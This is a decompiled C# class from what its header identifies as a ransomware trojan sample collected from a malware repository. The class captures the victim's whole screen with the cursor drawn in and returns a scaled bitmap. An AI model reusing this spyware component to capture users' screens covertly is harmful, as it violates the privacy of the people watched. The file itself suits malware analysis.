// Decompiled with JetBrains decompiler
// Type: thandhwiar.OCASCRNS
// Assembly: thandhwiar, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89805F93-CF8A-4ECE-A0DD-C3C2D313114A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-a0f6963845d7aeae328048da66059059fdbcb6cc30712fd10a34018caf0bd28a.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace thandhwiar
{
  internal class OCASCRNS
  {
    private const int CURSOR_SHOWING = 1;

    public Bitmap screen(int mheight)
    {
      Bitmap original = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format24bppRgb);
      try
      {
        using (Graphics graphics = Graphics.FromImage((Image) original))
        {
          graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
          OCASCRNS.CURSORINFO pci;
          pci.cbSize = Marshal.SizeOf(typeof (OCASCRNS.CURSORINFO));
          if (OCASCRNS.GetCursorInfo(out pci))
          {
            if (pci.flags == 1)
            {
              OCASCRNS.DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
              graphics.ReleaseHdc();
            }
          }
        }
      }
      catch
      {
        return (Bitmap) null;
      }
      int height = original.Height * (mheight * 100 / original.Height) / 100;
      int width = mheight + mheight * 100 / original.Width * mheight / 100 + 100;
      return new Bitmap((Image) original, new Size(width, height));
    }

    [DllImport("user32.dll")]
    private static extern bool GetCursorInfo(out OCASCRNS.CURSORINFO pci);

    [DllImport("user32.dll")]
    private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

    private struct POINTAPI
    {
      public int x;
      public int y;
    }

    private struct CURSORINFO
    {
      public int cbSize;
      public int flags;
      public IntPtr hCursor;
      public OCASCRNS.POINTAPI ptScreenPos;
    }
  }
}
